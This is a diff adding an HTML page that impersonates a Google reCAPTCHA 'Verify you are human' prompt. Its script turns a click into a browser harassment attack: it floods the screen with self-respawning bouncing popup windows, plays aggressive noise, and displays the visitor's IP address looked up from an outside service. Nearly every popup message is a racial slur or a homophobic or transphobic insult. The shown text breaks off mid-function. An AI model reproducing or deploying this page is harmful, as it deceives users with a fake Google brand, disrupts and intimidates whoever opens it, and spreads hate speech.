@@ -1,0 +1,1676 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>🔥 Tunczzzz Protection system 🔥</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: radial-gradient(circle at center, #1a1a2e, #0f0f1a);
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            user-select: none;
+            overflow: hidden;
+            cursor: default;
+        }
+        /* ─── FAKE GOOGLE VERIFY OVERLAY ─── */
+        #verifyOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.65);
+            backdrop-filter: blur(8px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 100000;
+            animation: fadeIn 0.3s ease-out;
+            cursor: pointer;
+        }
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+        .verify-modal {
+            background: white;
+            border-radius: 16px;
+            padding: 40px 36px;
+            max-width: 420px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
+            font-family: 'Roboto', Arial, sans-serif;
+            transition: transform 0.2s;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            cursor: default;
+            pointer-events: auto;
+        }
+        .verify-modal .google-logo {
+            font-size: 32px;
+            font-weight: 500;
+            letter-spacing: -0.5px;
+            margin-bottom: 12px;
+            font-family: 'Product Sans', Arial, sans-serif;
+        }
+        .verify-modal .google-logo span:nth-child(1) {
+            color: #4285F4;
+        }
+        .verify-modal .google-logo span:nth-child(2) {
+            color: #EA4335;
+        }
+        .verify-modal .google-logo span:nth-child(3) {
+            color: #FBBC05;
+        }
+        .verify-modal .google-logo span:nth-child(4) {
+            color: #4285F4;
+        }
+        .verify-modal .google-logo span:nth-child(5) {
+            color: #34A853;
+        }
+        .verify-modal .google-logo span:nth-child(6) {
+            color: #EA4335;
+        }
+        .verify-modal .icon-wrap {
+            width: 72px;
+            height: 72px;
+            border-radius: 50%;
+            background: #f1f3f4;
+            margin: 8px auto 16px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 36px;
+            color: #5f6368;
+        }
+        .verify-modal h2 {
+            color: #202124;
+            font-size: 22px;
+            font-weight: 400;
+            margin-bottom: 6px;
+        }
+        .verify-modal p {
+            color: #5f6368;
+            font-size: 14px;
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+        #verifyBtn {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 14px 24px;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s, box-shadow 0.2s;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+        }
+        #verifyBtn:hover {
+            background: #1557b0;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+        }
+        #verifyBtn:disabled {
+            background: #1557b0;
+            cursor: default;
+            opacity: 0.8;
+        }
+        .verify-modal .footer-text {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #9aa0a6;
+        }
+        .verify-modal .footer-text span {
+            color: #1a73e8;
+            cursor: pointer;
+        }
+        .spinner {
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top: 3px solid #ffffff;
+            border-radius: 50%;
+            width: 18px;
+            height: 18px;
+            animation: spin 0.8s linear infinite;
+            display: inline-block;
+        }
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+        .hidden {
+            display: none !important;
+        }
+
+        /* ─── CHAOS STYLES (activated after trigger) ─── */
+        .gem {
+            position: fixed;
+            pointer-events: none;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            z-index: 99999;
+            box-shadow: 0 0 40px rgba(255, 0, 68, 0.6);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2.4rem;
+            animation: gemFloat 0.8s ease-in-out infinite alternate;
+        }
+        @keyframes gemFloat {
+            0% {
+                transform: translateY(-12px) scale(1) rotate(0deg);
+            }
+            100% {
+                transform: translateY(12px) scale(1.15) rotate(15deg);
+            }
+        }
+        .graham-float {
+            position: fixed;
+            pointer-events: none;
+            color: #ff0044;
+            font-size: 2.2rem;
+            font-weight: 900;
+            text-shadow: 0 0 30px #ff0044, 0 0 60px #ff0044, 0 0 90px #ff0044;
+            z-index: 99998;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            letter-spacing: 2px;
+            white-space: nowrap;
+            animation: grahamPulse 0.4s ease-in-out infinite alternate;
+        }
+        @keyframes grahamPulse {
+            0% {
+                transform: scale(1) rotate(-4deg);
+                opacity: 0.8;
+            }
+            100% {
+                transform: scale(1.3) rotate(4deg);
+                opacity: 1;
+            }
+        }
+        .cursor-glow {
+            position: fixed;
+            pointer-events: none;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(255, 0, 68, 0.7), transparent 70%);
+            z-index: 99997;
+            transform: translate(-50%, -50%);
+            mix-blend-mode: screen;
+            animation: glowPulse 0.3s ease-in-out infinite alternate;
+        }
+        @keyframes glowPulse {
+            0% {
+                transform: translate(-50%, -50%) scale(1);
+                opacity: 0.6;
+            }
+            100% {
+                transform: translate(-50%, -50%) scale(1.4);
+                opacity: 1;
+            }
+        }
+        .bg-flash {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 99990;
+            background: radial-gradient(circle at center, rgba(255, 0, 68, 0.15), transparent 70%);
+            animation: flashBg 0.3s ease-in-out infinite alternate;
+        }
+        @keyframes flashBg {
+            0% {
+                opacity: 0.3;
+            }
+            100% {
+                opacity: 0.9;
+            }
+        }
+        .ip-display {
+            position: fixed;
+            left: 50%;
+            top: 8px;
+            z-index: 999999;
+            color: #ff0044;
+            font-size: 2.8rem;
+            text-shadow: 0 0 20px #ff0044, 0 0 40px #ff0044, 0 0 80px #ff0044;
+            transform: translateX(-50%);
+            font-weight: 900;
+            pointer-events: none;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            animation: ipPulse 0.5s ease-in-out infinite alternate;
+        }
+        @keyframes ipPulse {
+            0% {
+                opacity: 0.7;
+                transform: translateX(-50%) scale(1);
+            }
+            100% {
+                opacity: 1;
+                transform: translateX(-50%) scale(1.05);
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ─── FAKE GOOGLE VERIFY OVERLAY ─── -->
+    <div id="verifyOverlay">
+        <div class="verify-modal">
+            <div class="google-logo">
+                <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+            </div>
+            <div class="icon-wrap">🤖</div>
+            <h2>Verify you are human</h2>
+            <p>Click the button below to complete the verification process. This helps us keep the experience secure.</p>
+            <button id="verifyBtn">
+                <span id="btnText">Verify</span>
+            </button>
+            <div class="footer-text">
+                reCAPTCHA verification • <span>Privacy</span> - <span>Terms</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        //  GEGGY DATA – MAXIMUM OFFENSIVE CHAOS
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+        const geggyWords = ["geggy", "gegg", "geggs", "gegged", "GEG"];
+
+        const geggyImages = [
+            "semenretention.gif",
+            "raisinskin.gif",
+            "cadocompetition.gif",
+            "1758644561122i.webp"
+        ];
+
+        const geggyPasta = [
+            ">Biblically accurate niggers",
+            ">MyNigger.WAD",
+            ">Niggertank",
+            ">nigger detox",
+            ">inigger",
+            ">pizza nigger",
+            ">nigger.sponge",
+            ">chainsaw nigger",
+            ">demon nigger",
+            ">Me when I nigger on the internet",
+            ">I'm not your nigger",
+            ">my nigger",
+            ">problematic niggers",
+            ">safe nigger starter pack",
+            ">niggers taking Ls/Ws",
+            ">voice acting niggers",
+            ">the plural is nigger not niggers",
+            ">POV: nigger when they nig",
+            ">BLÅHAJ boyniggers",
+            ">none of these words are in the nigger",
+            ">turn-of-the-millenium niggers",
+            ">PNGniggers",
+            ">nigger loop",
+            ">it's called being a decent human nigger",
+            ">it's nigger as if",
+            ">nigger says trans rights!",
+            ">PS5 niggers",
+            ">likable niggers",
+            ">capynigger",
+            ">it's ok to watch cartoons as an nigger",
+            ">hypernigger",
+            ">ted nigger",
+            ">they're my literally me nigger",
+            ">dommy nigger",
+            ">nigger spice",
+            ">niggers looks better on CRT",
+            ">petite nigger",
+            ">stimming nigger",
+            ">it's ok to cry to niggers",
+            ">AI nigger",
+            ">Please grow and change as a nigger",
+            ">terminally nigger",
+            ">frutiger nigger",
+            ">my brother in nigger",
+            ">hazbin nigger",
+            ">spoopy nigger",
+            ">\"Nigger\" is NOT a word",
+            ">speculative nigger",
+            ">jrenigger",
+            ">non-euclidean niggers",
+            ">nigger simplification",
+            ">thank you for changing my nigger",
+            ">Ketchup nigger",
+            ">burn nigger",
+            ">youtube niggers",
+            ">having a normal nigger",
+            ">serotoninigger",
+            ">oops! you did a nigger",
+            ">comfort nigger",
+            ">edutainigger",
+            ">Don't yuck someone else's nigger",
+            ">biblically accurate angels copypasta",
+            ">soyjaks",
+            ">genre-defining",
+            ">a24",
+            ">slowburn",
+            ">bone-tingling",
+            ">/qa/",
+            ">gem",
+            ">coal",
+            ">sharty",
+            ">jarty",
+            ">shemmy",
+            ">brimstone",
+            ">_erald",
+            ">the gem/coal that saved/killed the sharty",
+            ">dust",
+            ">new toss",
+            ">4cuck",
+            ">SMVs",
+            ">the swede",
+            ">cobson",
+            ">swedish win",
+            ">norwegian fail",
+            ">variant:unknown",
+            ">you WILL",
+            ">deformed",
+            ">colorjaks",
+            ">sooty soot",
+            ">dogjak",
+            ">'jaks",
+            ">-ACK!",
+            ">'p",
+            ">neutralplier",
+            ">FAL",
+            ">croat",
+            ">vinluv",
+            ">'cord",
+            ">vantablack niggercoal",
+            ">punisherjaks",
+            ">soyduels",
+            ">wholesomejak",
+            ">amerimutt",
+            ">froge?",
+            ">rapeson",
+            ">caca",
+            ">larping as lee goldson",
+            ">frogposting",
+            ">/calm/",
+            ">niggerweed",
+            ">kolyma",
+            ">chudjak",
+            ">OMGSISA",
+            ">i transheart nigger",
+            ">take your meds",
+            ">schizo",
+            ">mental asylum",
+            ">_GOD",
+            ">_CUCK",
+            ">_troon",
+            ">_DEITY",
+            ">_slutta",
+            ">geg",
+            ">soytan",
+            ">the great purchase",
+            ">nate",
+            ">jake",
+            ">sean",
+            ">leebait",
+            ">no arrow",
+            ">five nights at cobsons",
+            ">poopson",
+            ">tsmt",
+            ">turkey tom",
+            ">goonclown",
+            ">nas",
+            ">ias",
+            ">soot",
+            ">lolkek",
+            ">captain coal",
+            ">kuz",
+            ">max",
+            ">doll",
+            ">red",
+            ">froot",
+            ">angeleno",
+            ">root",
+            ">tefal",
+            ">soybooru",
+            ">flartson",
+            ">unironically sucking off the fat janny like a faggot",
+            ">yotsoyba",
+            ">dancing_swede.mp4",
+            ">ongezellig",
+            ">thrembo",
+            ">brown troonjaks",
+            ">ohio",
+            ">on the 'log",
+            ">Soyjak Wiki",
+            ">babyjak",
+            ">trvthnvke",
+            ">trvke",
+            ">coinslot",
+            ">marge",
+            ">DOOOO THIIIIIIIIIIIIISSSSSSSSSSSSSSSSSSS",
+            ">nulee",
+            ">soycraft",
+            ">sproke",
+            ">fruitjaks",
+            ">nikocado avocado",
+            ">euromutt",
+            ">markiplier",
+            ">[x] won [y] lost",
+            ">slopjak",
+            ">'fe",
+            ">admin 6",
+            ">admin thrembo",
+            ">grimstone",
+            ">ominous 'jaks",
+            ">poop2",
+            ">[x] le bad even doe [y]",
+            ">it's over",
+            ">it's just getting started",
+            ">joel",
+            ">feralteen",
+            ">twitter immigrant",
+            ">TND",
+            ">amarna forum",
+            ">oh so [x] is [y] now? as expected of [z]",
+            ">brojak",
+            ">cytube",
+            ">bulgarian",
+            ">fnf pedo",
+            ">'zellig",
+            ">soyvil wars",
+            ">gigachad",
+            ">flart",
+            ">lute",
+            ">HWABAG",
+            ">HWNBAG",
+            ">HWABAS4BBC",
+            ">racebait",
+            ">le B_C girl!",
+            ">burundi is white",
+            ">mexican twink",
+            ">pinejak",
+            ">babybot",
+            ">fedschan",
+            ">chitwood",
+            ">GRAHAM RAT ON",
+            ">GRAHAM RAT ON you",
+            ">GRAHAM RAT ON me",
+            ">GRAHAM RAT ON everyone",
+            ">GRAHAM RAT ON the system",
+            ">GRAHAM RAT ON the internet",
+            ">GRAHAM RAT ON your face",
+            ">GRAHAM RAT ON my soul",
+            ">GRAHAM RAT ON the haters",
+            ">GRAHAM RAT ON the cops",
+            ">GRAHAM RAT ON the judge",
+            ">GRAHAM RAT ON the jury",
+            ">GRAHAM RAT ON the whole damn world",
+            ">GRAHAM RAT ON and on",
+            ">GRAHAM RAT ON forever",
+            ">GRAHAM RAT ON till I die",
+            ">GRAHAM RAT ON the grave",
+        ];
+
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        //  GLOBALS
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+        let gegHappening = false;
+        let ip = 'Unknown';
+        let mouseX = -9999,
+            mouseY = -9999;
+        let bouncingPopups = [];
+        const MAX_POPUPS = 30;
+        const REPULSION_FORCE = 4.0;
+        const BASE_SPEED = 16;
+        let audioCtx = null;
+        let bounceInterval = null;
+        let grahamFloatInterval = null;
+        let droneInterval = null;
+        let wins = [];
+        let isChildWindow = false;
+
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        //  HELPERS
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+        function getRandomArrayEntry(arr) {
+            return arr[Math.floor(Math.random() * arr.length)];
+        }
+
+        function getIP() {
+            if (ip !== 'Unknown') return Promise.resolve(ip);
+            return fetch('https://checkip.amazonaws.com')
+                .then(r => r.ok ? r.text() : 'Unknown')
+                .then(text => { ip = text.trim(); return ip; })
+                .catch(() => { ip = 'Unknown'; return ip; });
+        }
+
+        function randomRange(min, max) {
+            return Math.random() * (max - min) + min;
+        }
+
+        function clamp(v, min, max) {
+            return Math.max(min, Math.min(max, v));
+        }
+
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        //  AUDIO ENGINE – AGGRESSIVE
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+        function initAudio() {
+            if (!audioCtx) {
+                audioCtx = new(window.AudioContext || window.webkitAudioContext)();
+            }
+            if (audioCtx.state === 'suspended') {
+                audioCtx.resume().catch(() => {});
+            }
+            return audioCtx;
+        }
+
+        function playGlitch() {
+            try {
+                const ctx = initAudio();
+                const duration = 0.05 + Math.random() * 0.2;
+                const bufferSize = ctx.sampleRate * duration;
+                const buffer = ctx.createBuffer(1, bufferSize, ctx.sampleRate);
+                const data = buffer.getChannelData(0);
+                for (let i = 0; i < bufferSize; i++) {
+                    data[i] = (Math.random() * 2 - 1) * Math.exp(-i / (bufferSize * 0.2));
+                }
+                const source = ctx.createBufferSource();
+                source.buffer = buffer;
+                const gain = ctx.createGain();
+                gain.gain.setValueAtTime(0.15 + Math.random() * 0.2, ctx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + duration);
+                source.connect(gain);
+                gain.connect(ctx.destination);
+                source.start(ctx.currentTime);
+                source.stop(ctx.currentTime + duration);
+                source.detune.setValueAtTime(randomRange(-1200, 1200), ctx.currentTime);
+            } catch (_) {}
+        }
+
+        function playThump() {
+            try {
+                const ctx = initAudio();
+                const osc = ctx.createOscillator();
+                const gain = ctx.createGain();
+                osc.type = 'sawtooth';
+                osc.frequency.setValueAtTime(50 + Math.random() * 50, ctx.currentTime);
+                osc.frequency.exponentialRampToValueAtTime(20 + Math.random() * 30, ctx.currentTime + 0.15);
+                gain.gain.setValueAtTime(0.25 + Math.random() * 0.15, ctx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.2);
+                osc.connect(gain);
+                gain.connect(ctx.destination);
+                osc.start(ctx.currentTime);
+                osc.stop(ctx.currentTime + 0.2);
+            } catch (_) {}
+        }
+
+        function playSqueal() {
+            try {
+                const ctx = initAudio();
+                const osc = ctx.createOscillator();
+                const gain = ctx.createGain();
+                osc.type = 'square';
+                osc.frequency.setValueAtTime(600 + Math.random() * 800, ctx.currentTime);
+                osc.frequency.exponentialRampToValueAtTime(150 + Math.random() * 400, ctx.currentTime + 0.25);
+                gain.gain.setValueAtTime(0.06 + Math.random() * 0.08, ctx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.25);
+                osc.connect(gain);
+                gain.connect(ctx.destination);
+                osc.start(ctx.currentTime);
+                osc.stop(ctx.currentTime + 0.25);
+                osc.detune.setValueAtTime(randomRange(-1500, 1500), ctx.currentTime);
+            } catch (_) {}
+        }
+
+        function playNoise() {
+            try {
+                const ctx = initAudio();
+                const duration = 0.1 + Math.random() * 0.3;
+                const bufferSize = ctx.sampleRate * duration;
+                const buffer = ctx.createBuffer(1, bufferSize, ctx.sampleRate);
+                const data = buffer.getChannelData(0);
+                for (let i = 0; i < bufferSize; i++) {
+                    data[i] = (Math.random() * 2 - 1) * Math.sin(i / 10) * Math.exp(-i / (bufferSize * 0.3));
+                }
+                const source = ctx.createBufferSource();
+                source.buffer = buffer;
+                const gain = ctx.createGain();
+                gain.gain.setValueAtTime(0.1 + Math.random() * 0.15, ctx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + duration);
+                source.connect(gain);
+                gain.connect(ctx.destination);
+                source.start(ctx.currentTime);
+                source.stop(ctx.currentTime + duration);
+            } catch (_) {}
+        }
+
+        function startDrone() {
+            if (droneInterval) clearInterval(droneInterval);
+            droneInterval = setInterval(() => {
+                if (!gegHappening) return;
+                try {
+                    const r = Math.random();
+                    if (r < 0.35) playGlitch();
+                    if (r < 0.2) playThump();
+                    if (r < 0.15) playSqueal();
+                    if (r < 0.1) playNoise();
+                    if (Math.random() < 0.08) {
+                        const ctx = initAudio();
+                        const osc = ctx.createOscillator();
+                        const gain = ctx.createGain();
+                        osc.type = ['sine', 'sawtooth', 'square', 'triangle'][Math.floor(Math.random() * 4)];
+                        osc.frequency.setValueAtTime(30 + Math.random() * 50, ctx.currentTime);
+                        gain.gain.setValueAtTime(0.04 + Math.random() * 0.06, ctx.currentTime);
+                        gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.6);
+                        osc.connect(gain);
+                        gain.connect(ctx.destination);
+                        osc.start(ctx.currentTime);
+                        osc.stop(ctx.currentTime + 0.6);
+                        osc.detune.setValueAtTime(randomRange(-800, 800), ctx.currentTime);
+                    }
+                } catch (_) {}
+            }, 80);
+        }
+
+        function triggerAudioFeedback() {
+            playGlitch();
+            if (Math.random() < 0.4) playThump();
+            if (Math.random() < 0.3) playSqueal();
+            if (Math.random() < 0.2) playNoise();
+        }
+
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        //  BOUNCING POPUPS – EXTREME AGGRESSION
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+        function createBouncingPopup() {
+            const alive = bouncingPopups.filter(p => p.alive);
+            if (alive.length >= MAX_POPUPS) return null;
+
+            const width = 400;
+            const height = 280;
+            const sw = window.screen?.width || window.innerWidth || 1920;
+            const sh = window.screen?.height || window.innerHeight || 1080;
+
+            let x, y, attempts = 0;
+            do {
+                x = Math.random() * (sw - width);
+                y = Math.random() * (sh - height);
+                attempts++;
+            } while (attempts < 20 && Math.abs(x - sw / 2) < 300 && Math.abs(y - sh / 2) < 200);
+
+            x = clamp(x, 0, sw - width);
+            y = clamp(y, 0, sh - height);
+
+            let angle = Math.random() * Math.PI * 2;
+            let speed = BASE_SPEED + Math.random() * 8;
+            let dx = Math.cos(angle) * speed;
+            let dy = Math.sin(angle) * speed;
+
+            // SELF-CONTAINED popup – no external URL
+            const popup = window.open('', '_blank',
+                `width=${width},height=${height},left=${Math.round(x)},top=${Math.round(y)},menubar=no,toolbar=no,location=no,status=no,scrollbars=no,resizable=no`
+            );
+            if (!popup) return null;
+
+            const text = getRandomArrayEntry(geggyPasta);
+            const hue = Math.random() * 360;
+            const color = `hsl(${hue}, 100%, 60%)`;
+
+            // Inject content directly
+            popup.document.write(`
+                <!DOCTYPE html>
+                <html>
+                <head><meta charset="UTF-8"><title>🐀 GEG</title>
+                <style>
+                    *{margin:0;padding:0;box-sizing:border-box;}
+                    body{
+                        background:#0a0a12;
+                        color:${color};
+                        font-family:'Segoe UI',system-ui,sans-serif;
+                        display:flex;justify-content:center;align-items:center;
+                        height:100vh;margin:0;padding:12px;text-align:center;
+                        font-size:1.7rem;font-weight:900;word-break:break-word;
+                        text-shadow:0 0 30px ${color},0 0 60px ${color},0 0 90px ${color};
+                        background-image:radial-gradient(circle at center,#1a1a2e,#0a0a12);
+                        animation:flash 0.3s ease-in-out infinite alternate;
+                        cursor:none;
+                        overflow:hidden;
+                    }
+                    @keyframes flash{0%{opacity:0.7;transform:scale(1);}100%{opacity:1;transform:scale(1.08);}}
+                    .sub{font-size:0.75rem;color:#8892b0;margin-top:6px;display:block;font-weight:400;}
+                    .rat{font-size:3.5rem;display:block;margin-bottom:4px;animation:spin 1.2s linear infinite;}
+                    @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+                    .bg-pulse{position:fixed;top:0;left:0;right:0;bottom:0;background:radial-gradient(circle at center,${color}33,transparent 70%);pointer-events:none;animation:pulseBg 0.6s ease-in-out infinite alternate;}
+                    @keyframes pulseBg{0%{opacity:0.2;}100%{opacity:0.9;}}
+                    .glitch{position:fixed;top:0;left:0;right:0;bottom:0;pointer-events:none;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(255,0,0,0.03) 2px,rgba(255,0,0,0.03) 4px);animation:glitchMove 0.1s linear infinite;}
+                    @keyframes glitchMove{0%{transform:translateY(0);}100%{transform:translateY(4px);}}
+                </style>
+                </head>
+                <body>
+                    <div class="bg-pulse"></div>
+                    <div class="glitch"></div>
+                    <div>
+                        <span class="rat">🐀</span>
+                        ${text}
+                        <span class="sub">IP: ${ip}</span>
+                    </div>
+                    <script>
+                        // Child window self-bounce
+                        let vx = ${(Math.random() - 0.5) * 8};
+                        let vy = ${(Math.random() - 0.5) * 8};
+                        setInterval(() => {
+                            try {
+                                const x = window.screenX;
+                                const y = window.screenY;
+                                const w = window.outerWidth;
+                                const h = window.outerHeight;
+                                const sw = window.screen.availWidth || 1920;
+                                const sh = window.screen.availHeight || 1080;
+                                if (x < 5) vx = Math.abs(vx);
+                                if (x + w > sw - 5) vx = -Math.abs(vx);
+                                if (y < 30) vy = Math.abs(vy);
+                                if (y + h > sh - 5) vy = -Math.abs(vy);
+                                // Mouse repulsion (if parent sends mouse data)
+                                window.moveBy(vx, vy);
+                            } catch(_){}
+                        }, 20);
+                        // Aggressive audio in child
+                        try {
+                            const actx = new(window.AudioContext||window.webkitAudioContext)();
+                            const playNoise = () => {
+                                try {
+                                    const dur = 0.05 + Math.random() * 0.1;
+                                    const buf = actx.createBuffer(1, actx.sampleRate * dur, actx.sampleRate);
+                                    const d = buf.getChannelData(0);
+                                    for(let i=0;i<d.length;i++) d[i] = (Math.random()*2-1) * Math.exp(-i/(d.length*0.2));
+                                    const src = actx.createBufferSource();
+                                    src.buffer = buf;
+                                    const gn = actx.createGain();
+                                    gn.gain.setValueAtTime(0.08 + Math.random() * 0.1, actx.currentTime);
+                                    gn.gain.exponentialRampToValueAtTime(0.001, actx.currentTime + dur);
+                                    src.connect(gn);
+                                    gn.connect(actx.destination);
+                                    src.start(actx.currentTime);
+                                    src.stop(actx.currentTime + dur);
+                                } catch(_){}
+                            };
+                            setInterval(playNoise, 150);
+                        } catch(_){}
+                    <\/script>
+                </body>
+                </html>
+            `);
+            popup.document.close();
+            try { popup.focus(); } catch (_) {}
+
+            const popupData = {
+                win: popup,
+                x,
+                y,
+                dx,
+                dy,
+                w: width,
+                h: height,
+                sw,
+                sh,
+                alive: true,
+                speed: speed
+            };
+            bouncingPopups.push(popupData);
+            triggerAudioFeedback();
+
+            const checkClosed = setInterval(() => {
+                if (popup.closed) {
+                    clearInterval(checkClosed);
+                    popupData.alive = false;
+                    const idx = bouncingPopups.indexOf(popupData);
+                    if (idx > -1) bouncingPopups.splice(idx, 1);
+                    if (gegHappening) {
+                        setTimeout(() => createBouncingPopup(), 100);
+                    }
+                }
+            }, 100);
+
+            return popupData;
+        }
+
+        // ─── EXTREME BOUNCE ENGINE ───
+        function startBounceEngine() {
+            if (bounceInterval) clearInterval(bounceInterval);
+            bounceInterval = setInterval(() => {
+                const sw = window.screen?.width || window.innerWidth || 1920;
+                const sh = window.screen?.height || window.innerHeight || 1080;
+
+                for (const p of bouncingPopups) {
+                    if (!p.alive || p.win.closed) {
+                        p.alive = false;
+                        continue;
+                    }
+
+                    const popupCenterX = p.x + p.w / 2;
+                    const popupCenterY = p.y + p.h / 2;
+                    const dxToMouse = popupCenterX - mouseX;
+                    const dyToMouse = popupCenterY - mouseY;
+                    const distToMouse = Math.sqrt(dxToMouse * dxToMouse + dyToMouse * dyToMouse);
+
+                    // Strong mouse repulsion
+                    if (distToMouse < 450) {
+                        const force = REPULSION_FORCE * (1 - distToMouse / 450);
+                        const angle = Math.atan2(dyToMouse, dxToMouse);
+                        p.dx += Math.cos(angle) * force * 1.5;
+                        p.dy += Math.sin(angle) * force * 1.5;
+                    }
+
+                    // Random aggression
+                    p.dx += (Math.random() - 0.5) * 1.2;
+                    p.dy += (Math.random() - 0.5) * 1.2;
+
+                    const currentSpeed = Math.sqrt(p.dx * p.dx + p.dy * p.dy);
+                    const maxSpeed = 28;
+                    const minSpeed = 10;
+                    if (currentSpeed > maxSpeed) {
+                        p.dx = (p.dx / currentSpeed) * maxSpeed;
+                        p.dy = (p.dy / currentSpeed) * maxSpeed;
+                    } else if (currentSpeed < minSpeed && currentSpeed > 0.1) {
+                        const boost = minSpeed / currentSpeed;
+                        p.dx *= boost * 1.2;
+                        p.dy *= boost * 1.2;
+                    }
+
+                    p.x += p.dx;
+                    p.y += p.dy;
+
+                    if (p.x <= 0) { p.x = 0;
+                        p.dx = Math.abs(p.dx) + 2; }
+                    if (p.x >= sw - p.w) { p.x = sw - p.w;
+                        p.dx = -Math.abs(p.dx) - 2; }
+                    if (p.y <= 0) { p.y = 0;
+                        p.dy = Math.abs(p.dy) + 2; }
+                    if (p.y >= sh - p.h) { p.y = sh - p.h;
+                        p.dy = -Math.abs(p.dy) - 2; }
+
+                    try {
+                        p.win.moveTo(Math.round(p.x), Math.round(p.y));
+                    } catch (_) {}
+                }
+
+                if (gegHappening) {
+                    const alive = bouncingPopups.filter(p => p.alive);
+                    if (alive.length < MAX_POPUPS - 2 && Math.random() < 0.15) {
+                        createBouncingPopup();
+                    }
+                }
+            }, 12); // ~83fps for MAXIMUM SPEED
+        }
+
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        //  MOUSE TRACKING
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+        function initMouseTracking() {
+            document.addEventListener('mousemove', (e) => {
+                mouseX = e.clientX;
+                mouseY = e.clientY;
+            });
+            document.addEventListener('mouseleave', () => {
+                mouseX = -9999;
+                mouseY = -9999;
+            });
+            document.addEventListener('touchmove', (e) => {
+                const touch = e.touches[0];
+                if (touch) {
+                    mouseX = touch.clientX;
+                    mouseY = touch.clientY;
+                }
+            }, { passive: true });
+            document.addEventListener('touchend', () => {
+                mouseX = -9999;
+                mouseY = -9999;
+            });
+        }
+
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        //  VISUAL CHAOS – AGGRESSIVE
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+        function showIP() {
+            const div = document.createElement('div');
+            div.className = 'ip-display';
+            div.innerText = `🐀 IP: ${ip}`;
+            document.body.appendChild(div);
+        }
+
+        function spawnGems(count = 60) {
+            const emojis = ['💎', '🔥', '⭐', '🌀', '💥', '👾', '🤖', '💀', '👁️', '⚡', '🐀', '☠️', '👹', '💢', '⚡'];
+            for (let i = 0; i < count; i++) {
+                const el = document.createElement('div');
+                el.className = 'gem';
+                el.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+                el.style.background =
+                    `radial-gradient(circle at 30% 30%, hsl(${Math.random()*360}, 90%, 70%), hsl(${Math.random()*360}, 90%, 40%))`;
+                el.style.top = Math.random() * window.innerHeight + 'px';
+                el.style.left = Math.random() * window.innerWidth + 'px';
+                el.style.width = (40 + Math.random() * 50) + 'px';
+                el.style.height = el.style.width;
+                el.style.fontSize = (1.4 + Math.random() * 1.8) + 'rem';
+                el.style.animationDuration = (0.4 + Math.random() * 0.6) + 's';
+                document.body.appendChild(el);
+            }
+        }
+
+        function spawnFloatingGraham() {
+            if (grahamFloatInterval) clearInterval(grahamFloatInterval);
+            grahamFloatInterval = setInterval(() => {
+                if (!gegHappening) return;
